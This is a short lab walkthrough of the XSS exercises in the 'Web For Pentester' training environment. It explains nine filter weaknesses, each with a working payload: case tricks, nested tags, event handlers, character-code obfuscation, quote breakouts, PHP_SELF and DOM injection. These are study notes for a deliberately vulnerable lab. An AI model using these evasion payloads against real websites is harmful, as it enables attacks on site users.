## Cross Site Scripting (XSS) 
``` Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it. ```


### Web For Pentester ( XSS ) Walkthrough
### Example 1
``` There is no input validation, so, can exploit it directly with the classic “alert(1)” injection. ```
#### Payload - <script>alert(1)</script>


### Example 2
``` Filtered <script> and </script> with preg_replace function ```
#### Payload - <sCript>alert(1)</sCript> and <scr<script>ipt>alert(1)</scr</script>ipt>
  
  
### Example 3
``` Use PCRE modifier “i” (PCRE_CASELESS) to match both upper and lower case letters. However, recursion method still works fine. ```
#### Payload - <scr<script>ipt>alert(1)</scr</script>ipt>
  
  
  
### Example 4 
``` The script will stop when “script” is detected, Need other event without script ```
#### Payload - `<img src="x" onerror="alert(1)">  and <div onmousemove="alert(1)" src="xxxx"> , etc... `
  
  
  
### Example 5
``` Filtered keyword “alert” ```
#### Payload - <script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script> or <script>confirm(1)</script> or <script>prompt(1)</script>  etc ... 



### Example 6
``` User input has been included in “<script>” tab, so we do not need input “<script>” and just close the first double quote and use “//” to comment the following strings. ```
#### Payload - ";alert(1);//


### Example 7
``` This time the developer use PHP function “htmlentities()” to deal with user input, the “htmlentities()” function will encode special characters which will break the XSS injection. However, the developer did not indicate any flags to function “htmlentities()” which default only use flags “ENT_COMPAT | ENT_HTML401”, “ENT_COMPAT” flag only convert double quotes and leave single quotes alone```
#### Payload - ';alert(1);//



### Example 8
``` Did correct validation on parameter “name”, but the problem happened on “$_SERVER[PHP_SELF]”. Due to there is no validation on parameter “PHP_SELF” which is controlled by user. ( The filename of the currently executing script, relative to the document root. For instance, $_SERVER['PHP_SELF'] in a script at the address http://example.com/foo/bar.php would be /foo/bar.php. The __FILE__ constant contains the full path and filename of the current (i.e. included) file. If PHP is running as a command-line processor this variable contains the script name since PHP 4.3.0. -php.net )  ```
#### Payload - /" onmouseover="alert(1)



### Example 9
```  DOM-based XSS. the user input is in URL after “#”, so just put payload after “#” in URL will trigger the vulnerability ```
#### Payload - <script>alert(1)</script>  ( Test on IE or Edge )


### [Useful Link](https://owasp.org/www-community/xss-filter-evasion-cheatsheet#HTML_entities)


### Noted by [konova](https://www.facebook.com/kon0va)

### Ref : 
- [F4l13n5n0w](http://f4l13n5n0w.github.io/blog/2015/05/21/pentesterlab-web-for-pentester-xss/)
- [OWASP](https://owasp.org/www-community/attacks/Code_Injection)
- [php.net](https://www.php.net)
